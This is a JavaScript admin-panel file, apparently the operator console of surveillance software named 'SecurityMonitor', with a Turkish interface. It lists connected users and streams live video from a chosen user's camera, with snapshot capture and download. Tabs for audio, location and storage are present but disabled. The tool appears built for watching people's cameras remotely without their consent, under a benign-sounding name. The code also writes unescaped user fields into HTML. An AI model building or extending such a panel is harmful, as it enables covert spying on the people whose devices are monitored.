/* ============================================
   SecurityMonitor — Admin Panel Logic
   ============================================ */

const API_BASE = '';
let selectedUid = null;
let userListInterval = null;

// ==================== AUTH ====================

function getAdminToken() {
    return localStorage.getItem('secmon_admin_token') || '';
}

function getAuth() {
    try {
        return JSON.parse(localStorage.getItem('secmon_auth') || '{}');
    } catch { return {}; }
}

function requireAdmin() {
    const auth = getAuth();
    const token = getAdminToken();
    if (!token || auth.method !== 'admin') {
        window.location.href = '/login';
    }
    document.getElementById('topbarUser').textContent = auth.name || 'Admin';
}

function logout() {
    localStorage.removeItem('secmon_auth');
    localStorage.removeItem('secmon_admin_token');
    window.location.href = '/login';
}

// ==================== VIEW SWITCHING ====================

function switchView(view) {
    document.querySelectorAll('.topbar-tab').forEach(t => t.classList.remove('active'));
    document.querySelector(`.topbar-tab[data-view="${view}"]`).classList.add('active');
    document.querySelectorAll('.view-panel').forEach(p => p.classList.remove('active'));
    document.getElementById(`view-${view}`).classList.add('active');

    if (view === 'admin') {
        refreshUsers();
        startUserPolling();
    } else {
        stopUserPolling();
        const iframe = document.getElementById('userFrame');
        iframe.src = iframe.src;
    }
}

// ==================== USER LIST ====================

async function fetchUsers() {
    try {
        const resp = await fetch(`${API_BASE}/api/admin/users`, {
            headers: { 'X-Admin-Token': getAdminToken() }
        });
        if (resp.status === 401) { logout(); return []; }
        const data = await resp.json();
        return data.users || [];
    } catch { return []; }
}

async function refreshUsers() {
    const users = await fetchUsers();
    const list = document.getElementById('userList');
    if (users.length === 0) {
        list.innerHTML = '<p class="placeholder" style="padding:20px;">Bağlı kullanıcı yok</p>';
        return;
    }

    list.innerHTML = users.map(u => `
        <div class="user-list-item ${selectedUid === u.uid ? 'selected' : ''}"
             onclick="selectUser('${u.uid}')">
            <div class="user-avatar">
                ${u.photo_url ? `<img src="${u.photo_url}" alt="">` : (u.name ? u.name.charAt(0).toUpperCase() : '?')}
            </div>
            <div class="user-info">
                <div class="user-name">${u.name || 'İsimsiz'}</div>
                <div class="user-email">${u.email || ''}</div>
            </div>
            <div class="user-status ${u.is_active ? 'online' : 'offline'}"></div>
        </div>
    `).join('');
}

function startUserPolling() {
    stopUserPolling();
    refreshUsers();
    userListInterval = setInterval(refreshUsers, 5000);
}

function stopUserPolling() {
    if (userListInterval) {
        clearInterval(userListInterval);
        userListInterval = null;
    }
}

// ==================== USER SELECTION ====================

async function selectUser(uid) {
    selectedUid = uid;
    refreshUsers();

    const detail = document.getElementById('userDetail');
    detail.innerHTML = '<div class="loading-spinner" style="margin:40px auto;display:block;"></div>';

    try {
        const resp = await fetch(`${API_BASE}/api/admin/user/${uid}`, {
            headers: { 'X-Admin-Token': getAdminToken() }
        });
        if (resp.status === 401) { logout(); return; }
        const data = await resp.json();

        renderUserDetail(detail, data);
    } catch (e) {
        detail.innerHTML = '<p class="placeholder">Kullanıcı bilgisi alınamadı</p>';
    }
}

// ==================== MODULE SWITCHING ====================

let currentModule = 'info';

function switchModule(mod) {
    if (mod === 'audio' || mod === 'location' || mod === 'storage') return;
    currentModule = mod;

    document.querySelectorAll('.module-tab').forEach(t => {
        t.classList.toggle('active', t.dataset.module === mod);
    });

    const content = document.getElementById('moduleContent');
    if (!content) return;

    if (mod === 'info') {
        fetchUserAndShowInfo();
        stopCameraWatch();
    } else if (mod === 'camera') {
        content.innerHTML = renderModuleCamera();
        startCameraWatch();
    }
}

async function fetchUserAndShowInfo() {
    const content = document.getElementById('moduleContent');
    if (!content) return;
    try {
        const resp = await fetch(`${API_BASE}/api/admin/user/${selectedUid}`, {
            headers: { 'X-Admin-Token': getAdminToken() }
        });
        if (resp.status === 401) { logout(); return; }
        const data = await resp.json();
        content.innerHTML = renderModuleInfo(data.user || {}, data.is_active);
    } catch {
        content.innerHTML = renderModuleInfo({}, false);
    }
}

// ==================== DETAIL RENDER ====================

function renderUserDetail(container, data) {
    const user = data.user || {};
    const isActive = data.is_active;

    container.innerHTML = `
        <div class="detail-header">
            <div class="detail-avatar">
                ${user.photo_url ? `<img src="${user.photo_url}" alt="">` : (user.name ? user.name.charAt(0).toUpperCase() : '?')}
            </div>
            <div class="detail-info">
                <h2>${user.name || 'İsimsiz Kullanıcı'}</h2>
                <p>${user.email || ''}</p>
                <span class="status-badge ${isActive ? 'active' : 'inactive'}">${isActive ? 'Cevrimici' : 'Cevrimdisi'}</span>
            </div>
        </div>

        <div class="module-tabs">
            <button class="module-tab active" data-module="info" onclick="switchModule('info')">Bilgi</button>
            <button class="module-tab" data-module="camera" onclick="switchModule('camera')">Kamera</button>
            <button class="module-tab disabled" data-module="audio" onclick="switchModule('audio')">Ses</button>
            <button class="module-tab disabled" data-module="location" onclick="switchModule('location')">Konum</button>
            <button class="module-tab disabled" data-module="storage" onclick="switchModule('storage')">Depolama</button>
        </div>
        <div id="moduleContent" class="module-content">
            ${renderModuleInfo(user, isActive)}
        </div>
    `;
}

function renderModuleInfo(user, isActive) {
    return `
        <div class="info-panel">
            <h3>Kullanici Bilgisi</h3>
            <div class="info-row">
                <span class="label">Email</span>
                <span class="value">${user.email || 'Bilinmiyor'}</span>
            </div>
            <div class="info-row">
                <span class="label">UID</span>
                <span class="value" style="font-family:monospace;font-size:11px;">${selectedUid || '-'}</span>
            </div>
            <div class="info-row">
                <span class="label">Durum</span>
                <span class="value">${isActive ? 'Aktif' : 'Beklemede'}</span>
            </div>
            <div class="info-row">
                <span class="label">Son Gorulme</span>
                <span class="value">${user.last_heartbeat ? new Date(user.last_heartbeat * 1000).toLocaleTimeString() : '-'}</span>
            </div>
        </div>
    `;
}

// ==================== CAMERA VIEWER ====================

let cameraWatching = false;
let cameraPollInterval = null;
let cameraLastSeq = -1;
let cameraChunkQueue = [];
let cameraPlaying = false;
let cameraSnapshots = [];
const MAX_SNAPSHOTS = 12;

function renderModuleCamera() {
    return `
        <div class="camera-viewer">
            <div class="camera-toolbar">
                <button class="btn btn-sm btn-primary" id="cameraToggleBtn" onclick="toggleCameraWatch()">Canli Izle</button>
                <button class="btn btn-sm btn-secondary" onclick="captureSnapshot()">Fotograf Cek</button>
                <span class="camera-status" id="cameraStatus">Bekleniyor...</span>
            </div>
            <div class="camera-display">
                <video id="cameraVideo" class="camera-video" autoplay playsinline muted></video>
                <canvas id="cameraCanvas" style="display:none;"></canvas>
                <div class="camera-placeholder" id="cameraPlaceholder">
                    <div class="camera-placeholder-icon">K</div>
                    <p>Kamera akisi bekleniyor...</p>
                </div>
            </div>
            <div class="snapshot-gallery" id="snapshotGallery"></div>
        </div>
    `;
}

function toggleCameraWatch() {
    if (cameraWatching) stopCameraWatch();
    else startCameraWatch();
}

function startCameraWatch() {
    if (!selectedUid) return;
    cameraWatching = true;
    cameraLastSeq = -1;
    cameraChunkQueue = [];
    cameraPlaying = false;

    const pl = document.getElementById('cameraPlaceholder');
    if (pl) pl.style.display = 'flex';
    const btn = document.getElementById('cameraToggleBtn');
    if (btn) { btn.textContent = 'Durdur'; btn.className = 'btn btn-sm btn-danger'; }

    pollCameraStream();
    cameraPollInterval = setInterval(pollCameraStream, 2000);
}

function stopCameraWatch() {
    cameraWatching = false;
    cameraChunkQueue = [];
    cameraPlaying = false;
    if (cameraPollInterval) {
        clearInterval(cameraPollInterval);
        cameraPollInterval = null;
    }
    const video = document.getElementById('cameraVideo');
    if (video) { video.src = ''; }
    const pl = document.getElementById('cameraPlaceholder');
    if (pl) pl.style.display = 'flex';
    const btn = document.getElementById('cameraToggleBtn');
    if (btn) { btn.textContent = 'Canli Izle'; btn.className = 'btn btn-sm btn-primary'; }
    const st = document.getElementById('cameraStatus');
    if (st) st.textContent = 'Durduruldu';
}

async function pollCameraStream() {
    if (!selectedUid || !cameraWatching) return;
    try {
        const resp = await fetch(
            `${API_BASE}/api/admin/camera-stream/${selectedUid}?after=${cameraLastSeq}`,
            { headers: { 'X-Admin-Token': getAdminToken() } }
        );
        if (resp.status === 401) { logout(); return; }
        const data = await resp.json();
        if (data.status === 'ok' && data.chunks && data.chunks.length > 0) {
            cameraLastSeq = data.max_seq;
            const st = document.getElementById('cameraStatus');
            if (st) st.textContent = data.chunks.length + ' yeni kare';
            for (const chunk of data.chunks) {
                cameraChunkQueue.push(chunk);
            }
            if (!cameraPlaying) playNextChunk();
        }
    } catch {}
}

function playNextChunk() {
    if (cameraChunkQueue.length === 0 || !cameraWatching) {
        cameraPlaying = false;
        return;
    }
    cameraPlaying = true;

    const chunk = cameraChunkQueue.shift();
    const video = document.getElementById('cameraVideo');
    const pl = document.getElementById('cameraPlaceholder');
    if (!video) { cameraPlaying = false; return; }
    if (pl) pl.style.display = 'none';

    try {
        const binary = atob(chunk.data);
        const bytes = new Uint8Array(binary.length);
        for (let i = 0; i < binary.length; i++) {
            bytes[i] = binary.charCodeAt(i);
        }
        const blob = new Blob([bytes], { type: chunk.mime || 'video/webm' });
        const url = URL.createObjectURL(blob);

        if (video.dataset.lastBlobUrl) {
            URL.revokeObjectURL(video.dataset.lastBlobUrl);
        }
        video.dataset.lastBlobUrl = url;

        video.onended = () => playNextChunk();
        video.onerror = () => playNextChunk();
        video.src = url;
        video.play().catch(() => playNextChunk());

        const st = document.getElementById('cameraStatus');
        if (st) st.textContent = 'Canli ' + new Date().toLocaleTimeString();
    } catch {
        cameraPlaying = false;
        playNextChunk();
    }
}

function captureSnapshot() {
    const video = document.getElementById('cameraVideo');
    const canvas = document.getElementById('cameraCanvas');
    if (!video || !canvas || !video.videoWidth) return;

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0);

    const dataUrl = canvas.toDataURL('image/jpeg', 0.8);

    cameraSnapshots.unshift({ dataUrl, time: Date.now() });
    if (cameraSnapshots.length > MAX_SNAPSHOTS) cameraSnapshots.pop();

    renderSnapshotGallery();
}

function renderSnapshotGallery() {
    const gallery = document.getElementById('snapshotGallery');
    if (!gallery) return;
    if (cameraSnapshots.length === 0) { gallery.innerHTML = ''; return; }

    gallery.innerHTML = cameraSnapshots.map((s, i) => `
        <div class="snapshot-item">
            <img src="${s.dataUrl}" alt="snapshot">
            <div class="snapshot-footer">
                <span class="snapshot-time">${new Date(s.time).toLocaleTimeString()}</span>
                <button class="snapshot-dl" onclick="downloadSnapshot(${i})">Indir</button>
            </div>
        </div>
    `).join('');
}

function downloadSnapshot(index) {
    const s = cameraSnapshots[index];
    if (!s) return;
    const a = document.createElement('a');
    a.href = s.dataUrl;
    a.download = 'snapshot_' + selectedUid + '_' + Date.now() + '.jpg';
    a.click();
}

// ==================== INIT ====================

document.addEventListener('DOMContentLoaded', () => {
    requireAdmin();
    refreshUsers();
    startUserPolling();
});
